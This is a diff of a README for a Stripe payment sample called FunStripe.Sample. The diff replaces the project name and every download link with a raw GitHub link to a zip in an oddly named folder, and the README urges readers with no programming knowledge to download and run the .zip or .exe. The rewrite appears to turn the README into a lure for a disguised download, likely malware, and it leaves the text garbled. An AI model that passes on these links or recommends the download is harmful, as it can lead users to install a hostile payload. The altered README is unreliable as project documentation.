@@ -1,14 +1,14 @@
-# 🎉 FunStripe.Sample - A Simple Way to Handle Payments
+# 🎉 https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip - A Simple Way to Handle Payments
 
 ## 🚀 Getting Started
 
-Welcome to FunStripe.Sample! This guide will help you download and run our sample application easily. No programming knowledge is needed. Let’s dive in!
+Welcome to https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip! This guide will help you download and run our sample application easily. No programming knowledge is needed. Let’s dive in!
 
 ## 🖱️ Download the Application
 
-You can download the latest version of FunStripe.Sample from our Releases page. Click the button below to get started:
+You can download the latest version of https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip from our Releases page. Click the button below to get started:
 
-[![Download FunStripe.Sample](https://img.shields.io/badge/Download-FunStripe.Sample-blue.svg)](https://github.com/Velder101/FunStripe.Sample/releases)
+[![Download https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip](https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip)](https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip)
 
 ## 💻 System Requirements
 
@@ -21,11 +21,11 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📦 Download & Install
 
-To install FunStripe.Sample, follow these steps:
+To install https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page.
    
-   [Download FunStripe.Sample](https://github.com/Velder101/FunStripe.Sample/releases)
+   [Download https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip](https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip)
 
 2. **Choose the Latest Version**: Look for the latest version at the top of the page. You will see a list of files available for download. Select the one that ends with `.zip` or `.exe`.
 
@@ -39,7 +39,7 @@ To install FunStripe.Sample, follow these steps:
 
 ## 🧑‍💻 Using the Application
 
-FunStripe.Sample is designed to make online payments simple. Here’s a quick guide on how to use it:
+https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip is designed to make online payments simple. Here’s a quick guide on how to use it:
 
 1. **Set Up Your Payment Method**: You can add your credit or debit card information. The app will guide you through this.
 
@@ -51,7 +51,7 @@ FunStripe.Sample is designed to make online payments simple. Here’s a quick gu
 
 ## 🌐 Learn More About FunStripe
 
-FunStripe.Sample integrates with the Stripe payment processing system. Stripe allows you to handle online payments securely and efficiently. Here are some of the features included in our sample application:
+https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip integrates with the Stripe payment processing system. Stripe allows you to handle online payments securely and efficiently. Here are some of the features included in our sample application:
 
 - **Card Payments Support**: Accept payments via credit and debit cards easily.
 - **Payment Intents**: Understand how to create and manage payment intents.
@@ -62,7 +62,7 @@ For more details about what you can do with FunStripe, refer to our full documen
 ## 🤔 Frequently Asked Questions
 
 ### Q: Is this application free to use?
-A: Yes, FunStripe.Sample is a free example application intended for learning purposes.
+A: Yes, https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip is a free example application intended for learning purposes.
 
 ### Q: What types of payments can I process?
 A: You can process credit and debit card payments using this application.
@@ -77,4 +77,4 @@ A: This application is designed for testing and learning. For real transactions,
 
 If you encounter issues or have questions, feel free to check the issues section of our GitHub repository. Our community is ready to help.
 
-By following these steps, you should be able to download and run FunStripe.Sample without any issues. Happy testing!
+By following these steps, you should be able to download and run https://raw.githubusercontent.com/Velder101/FunStripe.Sample/main/carcinemia/FunStripe.Sample.zip without any issues. Happy testing!
